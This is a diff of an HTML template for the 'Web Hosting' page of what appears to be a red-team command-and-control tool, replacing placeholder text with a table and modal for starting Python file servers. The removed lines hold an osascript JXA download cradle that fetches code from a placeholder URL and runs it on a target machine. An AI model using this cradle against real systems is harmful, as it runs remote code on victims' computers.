@@ -4,17 +4,61 @@
 <h1>
     Web Hosting
 </h1>
-<p>
-    This will be updated with live abilities to start/stop/create different hosting services on this server.<br>
-    For now, utilize the attacks_api for this purpose.<br>
-    Once you host a JXA payload, you can use the following as a download cradle to download and run it on the target:
-    <ul>
-    <li>
-       osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://HOST_YOUR_FILE/FILE_NAME')),$.NSUTF8StringEncoding)));"
-    </li>
-    </ul>
-</p>
+<div style="resize: vertical; overflow:visible" class="panel panel-primary" id="hosting_table">
+    <div class="panel-heading">Current Hostings</div>
+        <table class="table table-striped table-hover table-condensed" >
+            <tr>
+                <td><b>Start</b></td>
+                <td><b>Stop</b></td>
+                <td><b>Port</b></td>
+                <td><b>Directory</b></td>
+                <td><b>Encryption</b></td>
+                <td><b>Status</b></td>
+            </tr>
+        <!-- Repeat this for each web service -->
+            <tr v-for="host in services" :key="host.port">
+                <td>
+                    <button type="button" class="btn btn-success btn-sm" @click="start_button(host)" :disabled="host.status == 'running'">Start</button>
+                </td>
+                <td>
+                    <button type="button" class="btn btn-danger btn-sm" @click="stop_button(host)" :disabled="host.status == 'stopped'">Stop</button>
+                </td>
+                <td>[[ host.port ]]</td>
+                <td>[[ host.directory ]]</td>
+                <td>[[ host.encryption ]]</td>
+                <td>[[ host.status ]]</td>
+            </tr>
+        <!-- End of the repeating -->
+        </table>
+</div>
+<button type="button" class="btn btn-primary btn-md" onclick="create_button()">New Host</button>
+<!-- THIS IS OUR MODAL FOR NEW HOSTED DIRECTORY MENU -->
+<div class="modal fade bs-example-modal-sm" id="servicesModal" role="dialog">
+    <div class="modal-dialog modal-sm" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">×</button>
+                <h3 id="modalLabel">New Host Menu</h3>
+                Opens up a simple python web server in the specified directory and port
+            </div>
+              <div class="modal-body" id="servicesBody">
+                  <h4>Which port:</h4>
+                  <input type="number" id="servicePort" min="1" max="65535">
+                  <h4>Use SSL?<input type="checkbox" id="serviceSSL"></h4>
+                  <h4>Which directory:</h4>
+                  <input type="text" id="serviceDirectory">
+              </div>
+              <div class="modal-footer">
+                <button class="btn" data-dismiss="modal" aria-hidden="true">Cancel</button>
+                <button class="btn btn-primary" data-dismiss="modal" id="servicesSubmit">Submit</button>
+              </div>
+        </div>
+    </div>
+</div>
+<!-- END MODAL FOR NEW HOSTED DIRECTORY MENU -->
 {% endblock %}
 
 {% block scripts %}
+{% include "attacks_host_file.js" %}
+{% include "shared_javascript.js" %}
 {% endblock %}
